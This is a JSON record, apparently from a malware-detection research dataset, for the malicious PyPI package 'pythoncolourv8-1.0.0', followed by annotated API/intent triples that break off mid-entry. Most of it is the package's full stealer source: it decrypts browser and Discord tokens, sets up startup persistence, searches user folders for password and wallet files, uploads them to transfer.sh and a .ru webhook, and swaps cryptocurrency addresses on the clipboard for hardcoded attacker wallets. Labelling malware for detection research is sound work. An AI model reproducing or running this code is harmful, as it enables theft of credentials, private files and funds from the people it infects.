{
  "metadata": {
    "package_name": "pythoncolourv8-1.0.0",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/pythoncolourv8-1.0.0.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/pythoncolourv8-1.0.0.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport sys\nimport subprocess\nimport shutil\nimport threading\nimport requests\nimport httpx\nimport base64\nimport json\nimport re\nimport ntpath\nimport zipfile\nimport sqlite3\nimport psutil\nimport pyperclip\nimport time\nfrom datetime import datetime, timedelta, timezone\nfrom tempfile import gettempdir, mkdtemp\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\n\n# Malicious configuration and webhook\n__config__ = {\n    'yourwebhookurl': \"https://kekwltd.ru/relay/bluescreen\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\n    'blprggg': [ ... ]\n}\n\n# --- Malicious Functions ---\n\nclass Functions(object):\n    @staticmethod\n    def gtmk3y(path: str or os.PathLike):\n        if not ntpath.exists(path):\n            return None\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        try:\n            master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n            return Functions.w1nd0_dcr(master_key[5:])\n        except KeyError:\n            return None\n    @staticmethod\n    def w1nd0_dcr(encrypted_str: bytes) -> str:\n        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]\n    @staticmethod\n    def dcrpt_val(buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return f'Failed to decrypt \"{str(buff)}\" | key: \"{str(master_key)}\"'\n    @staticmethod\n    def g3t_H(token: str = None):\n        headers = {\n            \"Content-Type\": \"application/json\",\n        }\n        if token:\n            headers.update({\"Authorization\": token})\n        return headers\n    @staticmethod\n    def net_1fo() -> list:\n        ip, city, country, region, org, loc, googlemap = \"None\", \"None\", \"None\", \"None\", \"None\", \"None\", \"None\"\n        req = httpx.get(\"https://ipinfo.io/json\")\n        if req.status_code == 200:\n            data = req.json()\n            ip = data.get('ip')\n            city = data.get('city')\n            country = data.get('country')\n            region = data.get('region')\n            org = data.get('org')\n            loc = data.get('loc')\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\n        return [ip, city, country, region, org, loc, googlemap]\n    @staticmethod\n    def fetch_conf(e: str) -> str or bool | None:\n        return __config__.get(e)\n\n# --- Clipboard Crypto Address Swapper ---\nclass auto_copy_wallet(Functions):\n    def __init__(self):\n        self.address_st3aler = self.fetch_conf(\"addresse_crypto_replacer\")\n        self.address_btc = self.fetch_conf(\"addresse_btc\")\n        self.address_eth = self.fetch_conf(\"addresse_eth\")\n        self.address_xchain = self.fetch_conf(\"addresse_xchain\")\n        self.address_pchain = self.fetch_conf(\"addresse_pchain\")\n        self.address_cchain = self.fetch_conf(\"addresse_cchain\")\n        self.address_monero = self.fetch_conf(\"addresse_monero\")\n        self.address_ada = self.fetch_conf(\"addresse_ada\")\n        self.address_dash = self.fetch_conf(\"addresse_dash\")\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search('addr1[a-z0-9]+', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# --- Main Stealer Class ---\nclass bc_initial_func(Functions):\n    def __init__(self):\n        self.dscap1 = \"https://discord.com/api/v9/users/@me\"\n        self.discord_webhook = self.fetch_conf('yourwebhookurl')\n        self.hide = self.fetch_conf(\"hide\")\n        self.pingtype = self.fetch_conf(\"pingtype\")\n        self.pingonrun = self.fetch_conf(\"ping\")\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.startupexe = self.fetch_conf(\"startup\")\n        self.fake_error = self.fetch_conf(\"fake_error\")\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')\n        self.dir, self.temp = mkdtemp(), gettempdir()\n        inf, net = self.sys_1fo(), self.net_1fo()\n        self.uuidwndz, self.w1nv3r, self.w1nk33y = inf[0], inf[1], inf[2]\n        self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]\n        self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n        self.regex_webhook_dsc = \".ru/relay\"\n        self.chrmrgx = re.compile(r'(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.tokens = []\n        self.bc_id = []\n        self.sep = os.sep;\n        self.robloxcookies = [];\n        self.chrome_key = self.gtmk3y(ntpath.join(self.chrmmuserdtt, \"Local State\"));\n        os.makedirs(self.dir, exist_ok=True);\n    def startupkekw(self: str) -> str:\n        if self.startupexe == \"yes\":\n            startup_path = os.getenv(\"appdata\") + \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n            if os.path.exists(startup_path + sys.argv[0]):\n                os.remove(startup_path + sys.argv[0])\n                shutil.copy2(sys.argv[0], startup_path)\n            else:\n                shutil.copy2(sys.argv[0], startup_path)\n    def steal_token(self):\n        paths = {\n            'Discord': self.roaming + '\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + '\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Lightcord': self.roaming + '\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + '\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Opera GX': self.roaming + '\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Amigo': self.appdata + '\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Torch': self.appdata + '\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Kometa': self.appdata + '\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Orbitum': self.appdata + '\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'CentBrowser': self.appdata + '\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            '7Star': self.appdata + '\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Sputnik': self.appdata + '\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Vivaldi': self.appdata + '\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome SxS': self.appdata + '\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome1': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome2': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome3': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome4': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome5': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\',\n            'Epic Privacy Browser': self.appdata + '\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Microsoft Edge': self.appdata + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',\n            'Uran': self.appdata + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Yandex': self.appdata + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Brave': self.appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Iridium': self.appdata + '\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'}\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \",\"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for filname in os.listdir(path):\n                        if filname[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                try:\n                                    token = self.dcrpt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\n                                except ValueError:\n                                    pass\n                                try:\n                                    r = requests.get(self.baseurl, headers={\n                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                        'Content-Type': 'application/json',\n                                        'Authorization': token})\n                                except Exception:\n                                    pass\n                                if r.status_code == 200:\n                                    uid = r.json()['id']\n                                    if uid not in self.bc_id:\n                                        self.tokens.append(token)\n                                        self.bc_id.append(uid)\n            else:\n                for filname in os.listdir(path):\n                    if filname[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            try:\n                                r = requests.get(self.baseurl, headers={\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                    'Content-Type': 'application/json',\n                                    'Authorization': token})\n                            except Exception:\n                                pass\n                            if r.status_code == 200:\n                                uid = r.json()['id']\n                                if uid not in self.bc_id:\n                                    self.tokens.append(token)\n                                    self.bc_id.append(uid)\n\n    def finished_bc(self):\n        # ...\n        _zipfile = ntpath.join(self.appdata, f'BC-[{os.getlogin()}].zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = ntpath.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = ntpath.abspath(ntpath.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        with open(_zipfile, 'rb') as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json={...})\n                httpx.post(self.discord_webhook, files={'upload_file': f})\n        os.remove(_zipfile)\n\n# --- Data Exfiltration via transfer.sh ---\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\n# --- File/Folder Search and Exfiltration ---\ndef bc_Folder_create(pathF, keywords):\n    global bc_create_files\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = bc_uploadanonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\n\ndef bc_create_file(path, keywords):\n    global bc_create_files\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, bc_uploadanonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    bc_Folder_create(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\n\ndef bc_checking():\n    user = gettempdir().split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [\n        \"passw\", \"mdp\", \"motdepasse\", \"mot_de_passe\", \"login\", \"secret\", \"account\", \"acount\", \"paypal\", \"banque\", \"metamask\", \"wallet\", \"crypto\", \"exodus\", \"discord\", \"2fa\", \"code\", \"memo\", \"compte\", \"token\", \"backup\", \"seecret\"\n    ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\n\n# --- Main Execution ---\nif __name__ == \"__main__\" and os.name == \"nt\":\n    import asyncio\n    asyncio.run(bc_initial_func().init())\n    # ...\n    wikith = bc_checking()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n",
          "triple_sequences": [
            {
              "action_api": "ntpath.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine_file_presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path, \"r\", encoding=\"utf-8\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "c",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state[\"os_crypt\"][\"encrypted_key\"]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "Functions.w1nd0_dcr()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key[5:]",
              "object_description": "Fernet-encrypted byte string",
              "object_id": "fernet_encrypted_bytes",
              "intention_description": "Decrypt_browser_master_key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "encrypted_str, None, None, None, 0",
              "object_description": "Fernet-encrypted byte string",
              "object_id": "fernet_encrypted_bytes",
              "intention_description": "Decrypt_browser_master_key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "AES.new()",
              "action_description": "Initializes symmetric encryption with provided key",
              "action_id": "init_symmetric_encryption",
              "object": "master_key, AES.MODE_GCM, iv",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt_encrypted_data",
              "intention_id": "decrypt_encrypted_data"
            },
            {
              "action_api": "cipher.decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "payload",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt_browser_password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "decrypted_pass[:-16]",
              "object_description": "Decompressed data",
              "object_id": "decompressed_data",
              "intention_description": "Decode_decrypted_password",
              "intention_id": "decode_decrypted_password"
            },
            {
              "action_api": "httpx.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "\"https://ipinfo.io/json\"",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "req.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access_clipboard_data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "re.search()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data",
              "object_description": "Regular expression and clipboard content",
              "object_id": "regex_clipboard_content",
              "intention_description": "Detect_cryptocurrency_address_clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "pyperclip.copy()",
              "action_description": "Copies specified text to system clipboard",
              "action_id": "copy_to_clipboard",
              "object": "self.address_btc",
              "object_description": "Cryptocurrency wallet address",
              "object_id": "wallet_address",
              "intention_description": "Replace_clipboard_crypto_address",
              "intention_id": "replace_clipboard_crypto_address"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"localappdata\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect_environment_variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "self.dir, exist_ok=True",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure_directory_exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "mkdtemp()",
              "action_description": "Creates temporary directory and returns its path",
              "action_id": "create_temp_dir",
              "object": "",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Create_temporary_directory",
              "intention_id": "create_temporary_directory"
            },
            {
              "action_api": "gettempdir()",
              "action_description": "Creates temporary directory and returns its path",
              "action_id": "create_temp_dir",
              "object": "",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Collect_temp_directory_path",
              "intention_id": "collect_temp_directory_path"
            },
            {
              "action_api": "ntpath.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "self.appdata, 'Google', 'Chrome', 'User Data'",
              "object_description": "Browser data directory",
              "object_id": "browser_data_directory",
              "intention_description": "Prepare_path_browser_data",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "startup_path + sys.argv[0]",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine_file_presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "startup_path + sys.argv[0]",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Delete_file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "sys.argv[0], startup_path",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Copy_file_startup_directory",
              "intention_id": "copy_file_startup_directory"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine_directory_presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List_directory_files",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\{filname}', errors='ignore'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read_file_content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.encrypted_regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract_encrypted_discord_tokens",
              "intention_id": "extract_encrypted_discord_tokens"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "y.split('dQw4w9WgXcQ:')[1]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode_encrypted_discord_token",
              "intention_id": "decode_encrypted_discord_token"
            },
            {
              "action_api": "self.get_master_key()",
              "action_description": "Retrieves and decrypts master key from local state",
              "action_id": "get_master_key",
              "object": "self.roaming + f'\\{disc}\\Local State'",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Decrypt_discord_master_key",
              "intention_id": "decrypt_discord_master_key"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.baseurl, headers={...}",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download_remote_content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "r.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Parse_JSON_data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract_browser_tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Creates new ZIP archive for writing",
              "action_id": "create_zip_archive",
              "object": "_zipfile, \"w\", zipfile.ZIP_DEFLATED",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create_zip_archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "self.dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "List_directory_files",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "zipped_file.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "absname, arcname",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Add_file_to_archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "zipped_file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close_file",
              "intention_id": "close_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "_zipfile, 'rb'",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Read_file_content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.discord_webhook, json={...}",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send_data_server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.discord_webhook, files={'upload_file': f}",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send_file_data_server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "_zipfile",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Delete_file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path, mode='rb'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read_file_content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "\"https://transfer.sh/\", files=files",
              "object_description": "File sharing endpoint",
              "object_id": "file_sharing_endpoint",
              "intention_description": "Transmit_file_data_server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "pathF",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List_directory_files",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
